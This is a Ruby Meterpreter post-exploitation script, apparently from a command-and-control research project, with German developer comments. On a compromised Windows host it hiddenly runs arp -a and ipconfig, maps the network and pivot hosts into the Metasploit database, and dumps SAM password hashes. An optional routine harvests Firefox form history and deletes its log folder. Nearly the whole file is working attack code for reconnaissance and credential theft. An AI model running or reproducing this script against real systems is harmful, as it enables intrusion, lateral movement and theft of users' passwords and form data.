require 'pp'

#dmke:
# Weitere Kleinigkeiten:
# * Zeile 20 match auch auf 999.999.999.999
# * Zeile 22 würde auch "xj-z-?.-@3-..." matchen "\S = nicht Whitespace"

$pivot

# Function for running arp -a on the owned host
def get_arp_a_infos
  hosts = Array.new
  cmd = 'arp -a'
  r, cmdout = '', ''  
  count = false
  r = @client.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
  while d = r.channel.read
    cmdout << d
  end 
  cmdout.split("\n").each do |line|
    # extract ip-adresses
    ip = line.scan /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/
    # extract MAC-adresses
    mac = line.scan /\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}/
    
    if count == false and not ip.empty?
      hostdata = Hash.new
      # write all information about the host in the database
      sysinfo = client.sys.config.sysinfo
  
      hostdata[:workspace] = session.framework.db.workspace
      hostdata[:host] 	   =  ip.first.to_s
      hostdata[:os_name]   = (sysinfo['OS'].split'(')[0].strip
      hostdata[:os_flavor] = ((sysinfo['OS'].split'(')[1].split',')[0].strip  
      hostdata[:os_sp]     = (((sysinfo['OS'].split'(')[1].split',')[1].split')')[0].strip
      hostdata[:name]      = sysinfo['Computer']
      hostdata[:arch]      = sysinfo['Architecture']
      hostdata[:os_lang]   = sysinfo['System Language']
      
      write_db hostdata
      hostdata[:host] = ip.first.to_s
      # Klappt noch nicht so ganz... da inkonsistenz durch doppelte IP-Adressen auftreten könnte
      $pivot = session.framework.db.get_host(hostdata)
      count = true
    end
    
    # write found ip- and mac adress in database           
    if not ip.empty? and not mac.empty?
      mac = mac.first.to_s.gsub('-',':')
      hostdata = Hash.new
      hostdata[:workspace] = session.framework.db.workspace
      hostdata[:host] =  ip.first.to_s
      hostdata[:mac] =  mac 
      if $pivot[:address]  != ip.first.to_s
        hostdata[:pivot_host_id] = $pivot[:id] 
      end
      write_db hostdata
    end
  end
  r.channel.close
  r.close
end

# Function for running ipconfig -all on the owned host
def get_host_infos
  hostdata = Hash.new
  r, cmdout = '', ''   
  r = @client.sys.process.execute('ipconfig /all', nil, {'Hidden' => true, 'Channelized' => true})
  while d = r.channel.read
    cmdout << d
  end 
    
  ips = Array.new
  macs = Array.new
  cmdout.split("\n").each do |line|
    hostdata = Hash.new
    # extract MAC-adresses
    mac = (line.scan /\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}/)
    if mac[0] != nil
      mac[0] = mac[0].gsub('-',':')
      macs << mac
    end 
    
    if macs[0] != nil
      # extract ip-adresses
      ip = (line.scan /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/)	
      if ip[0] != nil
	ips << ip
	# Check if IP-Adress is the one we attack
	if $pivot[:address] == ips[0].to_s
	   hostdata[:mac] = macs[0].first.to_s
	   hostdata[:host] = ips[0].first.to_s
	   
	   write_db hostdata
	   hostdata[:mac] = macs[0].first.to_s
	   hostdata[:host] = ips[0].first.to_s
	   $pivot = session.framework.db.get_host(hostdata)
	end
      end
    end
    if not macs.empty? and not ips.empty?
      macs = Array.new
      ips = Array.new
    end
  end
end

def write_db host
  if session.framework.db.active
    session.framework.db.report_host host
  end
end

#todo "run enum_firefox"
def save_frfx_forms hostID, newRun = false, clear = false
  
  if newRun 
    client.run_cmd("run enum_firefox") #works only local
  end
  props =   YAML.load_file( '/home/nox/dev/fidius2/candc/config/msf.yml' )
  frfxLogPath = "/home/" + props['def_user'] + "/.msf3/logs/scripts/enum_firefox/"
  arr = Array.new
  Dir.foreach(frfxLogPath) { |x| 
    arr << x
  }
  if arr.size == 0
    puts "save_frfx_forms abborted, coz no frfx-log-dir was found."
    return;
  end
 
  frfxLogDir =  frfxLogPath + arr.sort.last 
  
  File.open(frfxLogDir + "/main_form_history.txt") do |file|
    file.each do |line|
      lineArray = line.split
      FrfxForm.new(:host_id=>hostID,:form_name=>lineArray[1],:value=>lineArray[3]).save # insert into ...
    end
  end
  if clear 
    system 'rm -r ' + frfxLogDir
  end
end  

#Function for running the hashdump

def get_hashdump_information
  #print_status("Dumping password hashes...")
	begin
		@client.core.use("priv")
		hashes = @client.priv.sam_hashes
		hashes.each do |h|
		  HashDump.new(:host_id=>$pivot[:id],:hash_key=>h.to_s()).save
		end
		#print_status("Hashes Dumped")
	rescue ::Exception => e
		print_status("\tError dumping hashes: #{e.class} #{e}")
		print_status("\tPayload may be running with insuficient privileges!")
	end
end

# Has to be the first Function cause $Pivot is set
get_arp_a_infos

get_host_infos

get_hashdump_information


#save_frfx_forms $pivot[:id]
